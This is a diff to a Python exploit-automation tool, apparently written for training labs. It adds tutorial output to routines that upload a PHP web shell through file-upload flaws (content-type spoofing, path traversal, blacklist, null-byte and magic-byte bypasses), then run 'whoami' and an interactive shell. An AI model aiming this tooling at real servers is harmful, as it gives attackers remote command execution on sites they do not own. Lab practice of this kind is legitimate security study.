@@ -16,9 +16,10 @@ import os
 import dotenv
 from pathlib import Path
 import urllib3
+import json
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-dotenv.load_dotenv()
+dotenv.load_dotenv(dotenv_path="../.env")
 
 class FileUpload: 
     def __init__(self, url):
@@ -118,25 +119,50 @@ class FileUpload:
                 print(f"Error: {e}")
                 return False
         return True
-      
+    
+    def solve_tutorial(self, exploit_condition, type_of_exploit, burpsuite=False):
+        if not exploit_condition:
+            return False
+        
+        is_solve = input("Do you want to learn how to solve this lab? y or n: ")
+        if is_solve.lower() in ["y", "yes", "okay", "ok"]:
+            with open("./tutorial.json", "r") as f:
+                full_file = json.load(f)
+                exploit_tutorial = full_file['tutorial']
+                burpsuite_part = full_file['burpsuite']
+                if burpsuite:
+                    tutorial = full_file['common_steps'] + burpsuite_part + exploit_tutorial[str(type_of_exploit)] + full_file['end_steps']
+                else:
+                    tutorial = full_file['common_steps'] + exploit_tutorial[str(type_of_exploit)]+full_file['end_steps']
+                for lines in tutorial:
+                    print(lines)
+        return True
 
     def simple_file_upload(self):
         print("Trying simple file upload")
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf)
-        return self.exploit(file_upload_post)
+        exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition,type_of_exploit="simple_file_upload", burpsuite=False)
+        return exploit_condition
+        
 
     def content_type_file_upload(self):
         print("Trying content type vulnerability")
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, "image/png")
-        return self.exploit(file_upload_post)
+        exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="content_type", burpsuite=True)
+        return exploit_condition
 
     def path_traversal(self):
         print("Trying local file inclusion")
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, path_traversal=True)
-        return self.exploit(file_upload_post, path_traversal=True)
+        exploit_condition = self.exploit(file_upload_post, path_traversal=True)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="path_traversal", burpsuite=True)
+        return exploit_condition
+
     
     def blacklist_bypass(self):
         print("Trying to bypass blacklist")
@@ -165,7 +191,7 @@ class FileUpload:
         except FileNotFoundError as e:
             print(f"File was not found. Check if file is readable ;-)") 
         
-        exploit_url = f"{url}/files/avatars/web_shell.php2"
+        exploit_url = f"{self.url}/files/avatars/web_shell.php2"
         if payload_injection.start_payload(exploit_url, "whoami")  is None:
                 return False
         print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
@@ -184,19 +210,24 @@ class FileUpload:
                 break
             except Exception as e:
                 print(f"Error: {e}")
+        self.solve_tutorial(exploit_condition=True, type_of_exploit="blacklist_bypass", burpsuite=True)
         return True
     
     def null_byte_injection(self):
         print("Trying null byte injection")
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, obsfucated_extension=True)
-        return self.exploit(file_upload_post)
+        exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="null_byte", burpsuite=True)
+        return exploit_condition
     
     def magic_byte_file_upload(self):
         print("Trying magic bytes")
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, magic_byte=True)
-        return self.exploit(file_upload_post)
+        exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="magic_byte", burpsuite=True)
+        return exploit_condition
         
         
     def login(self):
@@ -238,7 +269,9 @@ class FileUpload:
                 continue
         print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
         return False
+def main():
+    url = input("Enter the link to exploit: ")
+    start = FileUpload(url)
+    start.login()
 
-url = input("Enter the link to exploit: ")
-start = FileUpload(url)
-start.login()
+main()
